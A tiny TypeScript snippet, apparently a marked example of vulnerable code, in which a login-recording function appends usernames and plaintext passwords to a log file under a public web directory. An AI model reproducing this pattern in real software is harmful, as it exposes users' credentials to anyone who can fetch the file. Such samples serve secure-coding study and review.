import { appendFileSync } from 'fs';

export function recordLogin(user: string, password: string): void {
~>  appendFileSync('public/logs/auth.log', `${user}:${password}\n`);
}
